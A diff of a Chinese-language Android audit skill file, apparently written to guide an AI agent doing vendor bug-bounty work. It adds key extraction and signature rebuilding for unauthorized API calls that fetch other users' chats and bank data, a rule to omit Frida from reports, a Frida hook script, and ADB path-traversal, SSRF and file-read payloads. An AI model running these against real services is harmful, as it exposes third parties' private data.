@@ -1,11 +1,11 @@
 ---
 name: android-security-audit
-description: 当目标为 Android APK / 预装应用 / 厂商系统应用（HyperOS/MIUI/工程模式/OTA/诊断工具），或需要组件安全深度挖掘（导出组件/Intent 重定向/WebView/JSBridge/ContentProvider/Binder/Deep Link）、无 Root 无 Frida 环境下的漏洞验证与 PoC 构建、需要按厂商 SRC 移动端收录标准评估漏洞价值时调用。负责 JADX 静态分析 + ADB 动态验证的深度审计。命中场景：预装 App 提权/越权、系统 App 弹窗欺骗、Deep Link 远程触发、WebView 沙箱文件读取、APP 后端域名与 appid/appkey 提取上报深挖。正式写报告由 report 技能负责。
+description: 当目标为 Android APK / 预装应用 / 厂商系统应用（HyperOS/MIUI/工程模式/OTA/诊断工具），或需要组件安全深度挖掘（导出组件/Intent 重定向/WebView/JSBridge/ContentProvider/Binder/Deep Link）、密钥追踪→未授权接口（DEX/SO/H5 提取 appId/appKey/签名密钥还原）、无 Root 无 Frida 环境下的漏洞验证与 PoC 构建、需要按厂商 SRC 移动端收录标准评估漏洞价值时调用。负责 JADX 静态分析 + ADB 动态验证的深度审计。命中场景：硬编码密钥/签名还原后未授权调接口、预装 App 提权/越权、系统 App 弹窗欺骗、Deep Link 远程触发、WebView 沙箱文件读取、APP 后端域名与 appid/appkey 提取上报深挖。正式写报告由 report 技能负责。
 ---
 
 # android-security-audit — Android APK 组件安全深度审计
 
-> **与 `mobile-iot-device-security` 的分工**：本技能专注 **Android APK 组件安全 + 无 Frida/无 Root 漏洞验证** 的深度挖掘（对标小米 HyperOS 等厂商 SRC 收录标准）；抓包突破、协议逆向、iOS/小程序/IoT/固件 见 `mobile-iot-device-security`。两者命中同一目标时，先用本技能出组件安全结论，再按需联动。
+> **与 `miniprogram-security` 的分工**：本技能专注 **Android APK 组件安全 + 无 Frida/无 Root 漏洞验证** 的深度挖掘（对标小米 HyperOS 等厂商 SRC 收录标准）；小程序（微信/支付宝/抖音）与微信云开发见 `miniprogram-security`。两者命中同一目标时，先用本技能出组件安全结论，再按需联动。
 
 ## 何时调用（触发条件）
 
@@ -22,7 +22,8 @@ description: 当目标为 Android APK / 预装应用 / 厂商系统应用（Hype
 - **本地攻击 (Local)**：需安装 PoC App、使用 ADB 或物理接触。
 - ✅ ADB / PoC App / 恶意 HTML 均为合法验证手段。
 - ❌ **禁止依赖 Frida / Hook / Root 作为漏洞利用核心**（厂商官方标记为忽略类）。
-- 不强制依赖抓包工具：JADX 静态分析 + ADB 动态验证即可完成全流程（弱加密/HTTP 明文如需抓包佐证，联动 `mobile-iot-device-security`）。
+- ✅ **Frida 边界**：允许作**密钥/签名追踪的取证工具**（见 一、密钥追踪专项）；最终 PoC 必须用提取的密钥直接构造签名请求（Python/curl），不依赖 Frida；报告不写 Frida，写密钥硬编码 + 接口未鉴权。
+- 不强制依赖抓包工具：JADX 静态分析 + ADB 动态验证即可完成全流程（弱加密/HTTP 明文如需抓包佐证，另行配置代理工具）。
 
 **证据纪律（Agent 防幻觉，强制）**
 - **不编造代码、文件名、路径**——只报告 JADX / ADB 实际输出的内容。
@@ -34,12 +35,13 @@ description: 当目标为 Android APK / 预装应用 / 厂商系统应用（Hype
 | 任务 | 直达章节 |
 |---|---|
 | 5 分钟快速上手 | → 快速开始 |
-| 全量静态审计 | → 一、静态分析（1.1~1.17） |
-| 发现漏洞，要动态验证 | → 二、动态验证 |
-| 构建 PoC App | → 三、PoC 开发规范 |
-| 判断发现值不值得报 | → 四、忽略清单与分流 |
+| 🔴 密钥追踪 → 未授权接口（最高优先级） | → 一、密钥追踪专项 |
+| 全量静态审计 | → 二、静态分析（2.1~2.17） |
+| 发现漏洞，要动态验证 | → 三、动态验证 |
+| 构建 PoC App | → 四、PoC 开发规范 |
+| 判断发现值不值得报 | → 五、忽略清单与分流 |
 | 写漏洞报告（正式 DOCX 提交稿） | → 调用 `report` 技能 |
-| 通用加固清单 | → 六、通用修复建议 |
+| 通用加固清单 | → 七、通用修复建议 |
 
 ## 📚 参考资源
 
@@ -73,6 +75,9 @@ apktool d <path/to/target.apk> -o /tmp/apktool_out
 ### Step 2：查找高危漏洞（按优先级 grep）
 
 ```bash
+# 优先级 0：密钥/签名特征（最高优先级，见 一、密钥追踪专项）
+grep -rniE "appKey|appSecret|secret|sign|signature|md5|encrypt|aes|rsa" /tmp/jadx_out/sources/
+
 # 优先级 1：Intent 重定向（高危）
 grep -rn "getParcelableExtra.*Intent\|startActivity.*getParcelable" /tmp/jadx_out/sources/
 
@@ -126,16 +131,99 @@ adb shell am start -n com.victim/.VulnActivity \
 - ✅ 成功执行任意命令 → **高危/严重** → 报告
 - ✅ 成功读取沙箱任意文件 → **高危** → 报告
 - ✅ 系统级 App 弹窗内容可控 → **中危** → 报告
-- ❌ 仅能启动自身导出组件 / allowBackup=True / 缺少证书绑定 → **忽略** → 不报告（见 四）
+- ❌ 仅能启动自身导出组件 / allowBackup=True / 缺少证书绑定 → **忽略** → 不报告（见 五）
 
 ---
 
-## 一、静态分析
+## 🔴 一、密钥追踪 → 未授权接口专项（最高优先级）
+
+> **为什么排第一**：厂商 App 把签名密钥/加密公钥写死在客户端是普遍现状，命中率远高于组件安全；直接调云端 API 还绕开 Web 入口的 WAF/风控。核心链：**客户端密钥/签名逻辑硬编码（DEX/SO/H5 三层）→ 服务端只验签名不验会话（伪鉴权）或未鉴权 → 离线还原签名，未授权调接口拿全量业务数据**。
+
+### 1.1 攻击模型与三层追踪总览
+
+**攻击链一句话**：拿到 1 个公开 uid/ID → 反编译提取 appId/appKey/签名密钥 → 还原 sign 拼接（如 `md5(appId+appKey+ts)`）→ 直接 POST 业务接口 → 未授权批量拉数据（聊天/订单/发票/用户信息）。
+
+| 层 | 场景 | 手段 | 典型产物 |
+|---|---|---|---|
+| DEX（Java/Kotlin） | 核心算法在 Java 层 | JADX 全局搜特征串 | 硬编码 appKey/secret，签名拼接可 Python 重写 |
+| SO（Native） | `System.loadLibrary` + native 方法 | IDA/Ghidra 静态定位 + Frida Hook 入参出参 | 拼好的明文/算好的签名；底线 Hook 网络库截 HTTP 明文 |
+| H5/JS（WebView 动态加载） | 热更新业务走远程 H5 | assets 提取 JS / chrome://inspect 断点 | JS 里 RSA 公钥/密钥，Python 构造同构 payload |
+
+### 1.2 DEX 层追踪（静态最快，先做这个）
+
+**特征 grep**（反编译产物）：
+```bash
+grep -rniE "appKey|appSecret|secret|sign|signature|md5|encrypt|aes|rsa" /tmp/jadx_out/sources/
+```
+- 命中后**追调用链**：找到签名函数（`sign = md5(appId + appKey + ts)` 之类），确认参数来源（uid、时间戳、固定盐）
+- **Python 重写**拼接与加密逻辑，离线可算任意请求签名
+- 常见形态：appId/appKey 是 IM/云服务凭证（网易云信/融云等）→ 可伪造签名调该服务接口
+
+**案例模板（聊天记录泄露链，匿名化）**：
+```bash
+# 1. 普通用户界面拿到 1 个数字 uid（主页/热门房）
+# 2. 反编译 APK 提取硬编码 appId/appKey
+#    appId  : <反编译提取>
+#    appKey : <反编译提取>
+# 3. sign = md5(appId + appKey + ts)          ← 还原签名算法
+# 4. POST /api/chat/sessions {"userId":<uid>}  → 列出该用户全部会话（滚雪球）
+# 5. POST /api/chat/history {"fr":<uid>,"to":<peer>} → 消息正文
+# 6. Base64 解码响应字段                       → 任意用户聊天记录未授权读取
+```
+→ 数据泄露/越权，中高危。
+
+### 1.3 SO 层追踪（静态定位 + 动态降维）
+
+**静态定位入口**：
+- `System.loadLibrary("xxx")` 确认加载的 so
+- IDA Pro / Ghidra 导出表搜 `Java_包名_类名_方法名`（静态注册）；无则找 `JNI_OnLoad` 并追 `RegisterNatives` 交叉引用（动态注册）
+
+**动态 Hook 入参出参（降维打击，不硬啃汇编）**：
+```js
+// Frida 脚本：Hook 导出函数，打印入参出参，直接拿明文与签名
+Java.perform(function(){
+  var target = Module.findExportByName("libxxx.so", "Java_com_example_xxx_sign");
+  Interceptor.attach(target, {
+    onEnter: function(args){ console.log("入参:", Memory.readCString(args[2])); },
+    onLeave: function(ret){ console.log("返回值:", Memory.readCString(ret)); }
+  });
+});
+```
+
+**底线追踪法（必杀技）**：函数都找不到时，Hook 底层网络库——`libc.so` 的 `send`/`sendto`、SSL 库的 `SSL_write`——在发包前一瞬间从内存截获**最终 HTTP 明文请求**，直接得到完整请求结构。
+
+**⚠️ Frida 边界规则（强制）**：
+- ✅ Frida 仅作**密钥/签名逻辑的取证工具**；最终 PoC 用提取的密钥直接构造签名请求（Python/curl），**不依赖 Frida**
+- ❌ 禁止把"用 Frida Hook"写成漏洞本身或利用依赖（厂商官方标记为忽略类）
+- 报告口径：写「密钥硬编码于客户端 + 服务端接口仅验签名未验会话/未鉴权」，全程不写 Frida
+
+### 1.4 H5/JS 层追踪（WebView 动态加载）
+
+- **本地提取**：解压 APK，`assets/` 目录提取 HTML/JS，直接搜加密库（`JSEncrypt`、`CryptoJS`）与密钥常量
+- **远程调试**：动态加载的远程 JS → BurpSuite 注入 JS 断点代码，或 `chrome://inspect` 连接手机 WebView 前端断点，内存中直接看加密函数入参与密钥
+- **密钥复用**：拿到 RSA 公钥或取密钥接口后，用 Python 构造相同加密 payload 发请求
+
+**案例模板（H5 企业数据泄露链，匿名化）**：
+```bash
+# 1. GET /api/common/publicKey   → 返回 RSA 公钥 + uuid（零登录）
+# 2. 客户端用公钥加密查询关键字 title
+# 3. POST /api/invoice/titleQuery → 返回匹配企业抬头/税号/开户行/银行账号/地址/电话
+```
+→ 注意：**RSA 公钥只做"传输混淆"，不是鉴权**——拿到公钥即可构造合法密文，无需私钥；接口无 Token/登录校验 = 未授权数据泄露，高危。
+
+### 1.5 验证要点与报告口径
+
+- **取证链**：① 反编译/JADX 定位硬编码密钥（截图+路径）② 签名/加密逻辑还原（Python 脚本）③ 未授权请求成功返回真实数据（Burp 请求块+响应截图）
+- 影响证明：拉到的数据必须是**他人/全量**数据（非自己账号、非样例）
+- 定级：聊天/隐私/财务数据批量泄露 → 中高危；可写可删 = 高危/严重
+- 正式报告走 `report` 技能；不写 Frida、不写逆向工具名，只写密钥硬编码 + 接口鉴权缺失
+
+## 二、静态分析
 
 **工具**：JADX（反编译）+ apktool（Manifest/资源）
 **目标**：锁定攻击面，覆盖厂商全部收录漏洞类型
 
-### 1.1 Manifest 分析
+### 2.1 Manifest 分析
 
 ```bash
 cat /tmp/apktool_out/AndroidManifest.xml
@@ -152,7 +240,7 @@ cat /tmp/apktool_out/AndroidManifest.xml
 
 ---
 
-### 1.2 Intent 安全（高优先级，可产出高危/中危）
+### 2.2 Intent 安全（高优先级，可产出高危/中危）
 
 ```bash
 grep -rn "getParcelableExtra\|startActivity\|startService\|sendBroadcast\|PendingIntent" \
@@ -208,7 +296,7 @@ adb shell am start -n com.victim/.VulnActivity \
 
 ---
 
-### 1.3 数据访问安全（可产出中危~高危）
+### 2.3 数据访问安全（可产出中危~高危）
 
 ```bash
 grep -rn "openFile\|openAssetFile\|ParcelFileDescriptor\|rawQuery\|ZipInputStream\|ZipEntry" \
@@ -248,7 +336,7 @@ adb shell content query --uri "content://com.victim.provider/users" --where "nam
 
 ---
 
-### 1.4 WebView 安全（可产出中危~高危）
+### 2.4 WebView 安全（可产出中危~高危）
 
 ```bash
 grep -rn "setJavaScriptEnabled\|addJavascriptInterface\|evaluateJavascript\|loadUrl\|loadDataWithBaseURL" \
@@ -281,7 +369,7 @@ adb shell am start -n com.victim/.WebViewActivity --es url "file:///data/data/co
 
 ---
 
-### 1.5 敏感数据与加密
+### 2.5 敏感数据与加密
 
 ```bash
 grep -rn "Cipher.getInstance\|AES/ECB\|AES/CBC\|getSharedPreferences\|MODE_WORLD_READABLE\|getExternalStorageDirectory\|Log\.d\|Log\.v\|Log\.i" \
@@ -304,7 +392,7 @@ grep -rn "Cipher.getInstance\|AES/ECB\|AES/CBC\|getSharedPreferences\|MODE_WORLD
 
 ---
 
-### 1.6 认证与权限
+### 2.6 认证与权限
 
 ```bash
 grep -rn "X509TrustManager\|checkServerTrusted\|HostnameVerifier\|onReceivedSslError\|getExtras\|getParcelable\|getSerializable\|PreferenceActivity\|isValidFragment" \
@@ -328,7 +416,7 @@ grep -rn "X509TrustManager\|checkServerTrusted\|HostnameVerifier\|onReceivedSslE
 
 ---
 
-### 1.7 广播安全
+### 2.7 广播安全
 
 ```bash
 grep -rn "sendOrderedBroadcast\|registerReceiver\|sendStickyBroadcast" /tmp/jadx_out/sources/
@@ -340,7 +428,7 @@ grep -rn "sendOrderedBroadcast\|registerReceiver\|sendStickyBroadcast" /tmp/jadx
 
 ---
 
-### 1.8 系统功能滥用（可产出中危~严重）
+### 2.8 系统功能滥用（可产出中危~严重）
 
 ```bash
 grep -rn "Settings.Secure.putString\|Settings.System.putString\|Settings.Global.putString\|enabled_accessibility_services\|PackageInstaller" \
@@ -372,7 +460,7 @@ adb shell am start -n com.victim/.VulnActivity --es service "com.malicious/.Mali
 
 ---
 
-### 1.9 Binder 服务安全（可产出高危，系统 App 重点）
+### 2.9 Binder 服务安全（可产出高危，系统 App 重点）
 
 ```bash
 grep -rn "ServiceManager.addService\|ServiceManager.getService\|checkCallingPermission\|checkCallingUid\|onBind" \
@@ -388,7 +476,7 @@ grep -rn "ServiceManager.addService\|ServiceManager.getService\|checkCallingPerm
 # Step 1: 找到 ServiceManager.addService("custom_service", ...)
 # Step 2: 提取 AIDL
 find /tmp/jadx_out/sources -name "*.aidl"
-# Step 3: 构建 PoC App 调用该服务（见 三）
+# Step 3: 构建 PoC App 调用该服务（见 四）
 ```
 
 **漏洞判定**
@@ -407,7 +495,7 @@ adb shell ps -Z | grep <package>
 
 ---
 
-### 1.10 Deep Link 安全（可产出中危~高危）
+### 2.10 Deep Link 安全（可产出中危~高危）
 
 ```bash
 grep -A5 "android:scheme\|android:host\|android:autoVerify" /tmp/apktool_out/AndroidManifest.xml
@@ -451,7 +539,7 @@ adb shell am start -a android.intent.action.VIEW \
 
 ---
 
-### 1.11 SSRF 与网络请求安全（可产出中危~高危）
+### 2.11 SSRF 与网络请求安全（可产出中危~高危）
 
 ```bash
 grep -rn "URL()\|HttpURLConnection\|OkHttpClient\|Retrofit\|openConnection" /tmp/jadx_out/sources/ | \
@@ -478,7 +566,7 @@ adb shell am start -n com.victim/.VulnActivity --es url "http://169.254.169.254/
 
 ---
 
-### 1.12 WebView JSBridge 安全（可产出中危~严重）
+### 2.12 WebView JSBridge 安全（可产出中危~严重）
 
 ```bash
 grep -rn "shouldOverrideUrlLoading\|@JavascriptInterface\|jsbridge\|evaluateJavascript" /tmp/jadx_out/sources/
@@ -486,7 +574,7 @@ grep -rn "shouldOverrideUrlLoading\|@JavascriptInterface\|jsbridge\|evaluateJava
 
 **自定义 JSBridge**
 - `shouldOverrideUrlLoading()` 中对自定义 scheme（如 `jsbridge://`）的拦截处理；检查 method 白名单是否完整、param 是否有校验。
-- 若 WebView 加载的 URL 可控（见 1.4），攻击者可通过注入 JS 调用 JSBridge 任意方法。
+- 若 WebView 加载的 URL 可控（见 2.4），攻击者可通过注入 JS 调用 JSBridge 任意方法。
 
 **验证步骤**
 ```bash
@@ -506,7 +594,7 @@ grep -rn "shouldOverrideUrlLoading\|@JavascriptInterface\|jsbridge\|evaluateJava
 
 ---
 
-### 1.13 Native 库安全（可产出高危）
+### 2.13 Native 库安全（可产出高危）
 
 ```bash
 strings /tmp/apktool_out/lib/arm64-v8a/*.so | grep -E "JNI_OnLoad|Java_"
@@ -526,7 +614,7 @@ grep -rn "System.loadLibrary\|System.load\|DexClassLoader\|PathClassLoader" /tmp
 
 ---
 
-### 1.14 Fragment Injection 扩展
+### 2.14 Fragment Injection 扩展
 
 ```bash
 grep -rn "Fragment.instantiate\|getStringExtra.*fragment\|isValidFragment" /tmp/jadx_out/sources/
@@ -545,7 +633,7 @@ adb shell am start -n com.victim/.VulnActivity --es fragment "com.malicious.Mali
 
 ---
 
-### 1.15 命令执行（可产出高危~严重）
+### 2.15 命令执行（可产出高危~严重）
 
 ```bash
 grep -rn "Runtime.getRuntime\|ProcessBuilder\|\"su\"\|\"su -c\"\|ShellUtils\|CommandUtils\|RootCmd\|\.exec(" \
@@ -580,7 +668,7 @@ adb logcat | grep "uid="
 - 追踪 `ShellUtils.execCommand(String cmd)` / `CommandUtils` / `RootCmd` 等工具类的调用链，检查 `cmd` 参数是否可被外部控制；厂商系统 App 经常封装 shell 执行工具类且多个导出组件共用。
 
 **通过 WebView/JSBridge 间接触发**
-- 若 JSBridge 方法调用了 `exec()` / `ProcessBuilder`，配合 WebView URL 注入（见 1.4）可实现**远程命令执行（RCE）**。
+- 若 JSBridge 方法调用了 `exec()` / `ProcessBuilder`，配合 WebView URL 注入（见 2.4）可实现**远程命令执行（RCE）**。
 
 **漏洞判定**
 - 远程命令执行 → **严重**
@@ -589,7 +677,7 @@ adb logcat | grep "uid="
 
 ---
 
-### 1.16 权限/合规越权（HyperOS 重点）
+### 2.16 权限/合规越权（HyperOS 重点）
 
 ```bash
 grep -rn "TelephonyManager\|getImei\|getMeid\|getSubscriberId\|getSimSerialNumber\|Build.getSerial\|RoleManager\|isRoleHeld\|CALL_PHONE\|ANSWER_PHONE_CALLS\|startForeground\|CAMERA\|NotificationChannel\|setCategory\|IMPORTANCE_HIGH\|voip\|push\|qps" \
@@ -613,7 +701,7 @@ grep -rn "TelephonyManager\|getImei\|getMeid\|getSubscriberId\|getSimSerialNumbe
 
 ---
 
-### 1.17 推送/通知越权（业务逻辑重点）
+### 2.17 推送/通知越权（业务逻辑重点）
 
 ```bash
 grep -rn "NotificationChannel\|NotificationManager\|VoipService\|setCategory\|IMPORTANCE_HIGH\|sendStickyBroadcast" \
@@ -630,11 +718,11 @@ grep -rn "NotificationChannel\|NotificationManager\|VoipService\|setCategory\|IM
 
 ---
 
-## 二、动态验证
+## 三、动态验证
 
 **验证原则**：发现漏洞后必须立即验证。**优先尝试远程利用方式**，若远程验证不成功或不适用，再尝试本地利用方式。
 
-### 2.1 远程利用验证（优先级 1）
+### 3.1 远程利用验证（优先级 1）
 
 针对导出的 Activity（配置了 Scheme/Host）或 WebView 存在跨域/JS 漏洞：
 
@@ -646,7 +734,7 @@ grep -rn "NotificationChannel\|NotificationManager\|VoipService\|setCategory\|IM
 
 其他远程方式：检查是否可通过特定格式的短信/邮件内容触发漏洞。
 
-### 2.2 本地利用验证（优先级 2）
+### 3.2 本地利用验证（优先级 2）
 
 ```bash
 # 启动导出 Activity
@@ -665,10 +753,10 @@ adb shell content query --uri content://com.victim.provider/path
 adb shell content read --uri "content://com.victim.provider/../../../data/data/com.victim/databases/private.db"
 ```
 
-- 先用 ADB 快速验证，确认漏洞后再构建 PoC APK（见 三）提升报告质量。
+- 先用 ADB 快速验证，确认漏洞后再构建 PoC APK（见 四）提升报告质量。
 - **纯 ADB 验证的漏洞评级不会高于"本地"级别**。若漏洞可通过恶意 App 利用，务必补充 PoC APK 争取更高评级。
 
-### 2.3 合规越权验证
+### 3.3 合规越权验证
 
 - 记录申请能力与业务声明（权限用途说明、白名单/VoIP 申请理由）。
 - 触发实际场景并取证（后台/前台状态、用户是否可感知、消息内容类型）。
@@ -676,9 +764,9 @@ adb shell content read --uri "content://com.victim.provider/../../../data/data/c
 
 ---
 
-## 三、PoC 开发规范
+## 四、PoC 开发规范
 
-### 3.1 项目结构
+### 4.1 项目结构
 
 ```text
 poc_project/
@@ -693,7 +781,7 @@ poc_project/
 └── settings.gradle
 ```
 
-### 3.2 Java 21 兼容配置（Kali 等高版本环境）
+### 4.2 Java 21 兼容配置（Kali 等高版本环境）
 
 ```properties
 # gradle/wrapper/gradle-wrapper.properties
@@ -715,7 +803,7 @@ android {
 
 > 若 Gradle 未自动识别 SDK，在 `local.properties` 中手动指定：`sdk.dir=/path/to/android-sdk`；AGP 8.0+ 需在 `gradle.properties` 加 `android.useAndroidX=true`。
 
-### 3.3 常见 PoC 模板
+### 4.3 常见 PoC 模板
 
 **Intent 重定向 PoC**
 
@@ -801,9 +889,9 @@ location.href = "jsbridge://readFile?path=/data/data/com.victim/databases/privat
 
 ---
 
-## 四、忽略清单与分流规则
+## 五、忽略清单与分流规则
 
-### 4.1 忽略清单（不收录，勿浪费时间）
+### 5.1 忽略清单（不收录，勿浪费时间）
 
 **代码与数据保护类**
 - ❌ 缺少证书绑定（Certificate Pinning）
@@ -831,7 +919,7 @@ location.href = "jsbridge://readFile?path=/data/data/com.victim/databases/privat
 
 **关键判断**：如果漏洞的"利用"依赖 Root/Frida，或效果仅是 App 崩溃可重启，直接标记为忽略。
 
-### 4.2 分流规则
+### 5.2 分流规则
 
 **优先报告**（高价值漏洞）
 1. ✅ 远程可达的漏洞（无需安装 PoC App）
@@ -847,7 +935,7 @@ location.href = "jsbridge://readFile?path=/data/data/com.victim/databases/privat
 
 **不报告**：见 4.1 忽略清单。
 
-### 4.3 合规越权分流（非忽略但不直接按高危计分）
+### 5.3 合规越权分流（非忽略但不直接按高危计分）
 
 以下问题**不要直接忽略**，也**不要直接按高危技术漏洞计分**，进入"合规越权"分流：
 - 权限申请理由与实际用途不一致（名实不符）。
@@ -860,16 +948,17 @@ location.href = "jsbridge://readFile?path=/data/data/com.victim/databases/privat
 
 ---
 
-## 五、验证要点
+## 六、验证要点
 
+- **🔴 密钥追踪链（最高优先级，见 一）**：提取密钥（DEX grep / SO Hook / H5 提取）→ 还原签名/加密逻辑（Python 重写）→ 未授权请求成功返回真实数据 = 直接成洞
 - 每个导出组件（Activity/Service/Receiver/Provider）都要回答：能否被外部触发（exported？有权限保护？有来源校验？）→ 参数可控 → 流向敏感操作（startActivity/exec/文件/数据库/UI 渲染）。
 - **远程优先**：能通过 Deep Link/恶意网页触发的漏洞，评级高于 ADB 触发；验证时优先构造 HTML PoC。
 - **字符串匹配 ≠ 证明执行**：grep 命中后必须沿调用链确认参数可达性与校验缺失，并截图取证。
 - 组件间组合：Deep Link → WebView → JSBridge → 命令执行/文件读取 是多技能组合链（见 AGENTS.md 4.4），不要停在单点。
 - 报告评级与成稿：漏洞定级与正式 DOCX 报告由 `report` 技能的分层验证门把关，本技能负责把证据链做扎实（截图、调用链、A/B 交叉证明）。
-- 联动 `mobile-iot-device-security`：需要抓包佐证弱加密/HTTP 明文、so 层深度逆向、iOS/小程序/IoT 时切换。
+- 小程序目标见 `miniprogram-security`；so 层深度逆向（IDA/Ghidra）不在本技能范围，可另行处理。
 
-## 六、通用修复建议
+## 七、通用修复建议
 
 - 组件最小暴露：无外部需求一律 `android:exported="false"`；导出的组件加自定义权限保护 `android:permission`（signature 级）。
 - 敏感操作组件：校验 `callingPackage` / `getCallingUid()` 白名单，Intent extras 严格白名单化。
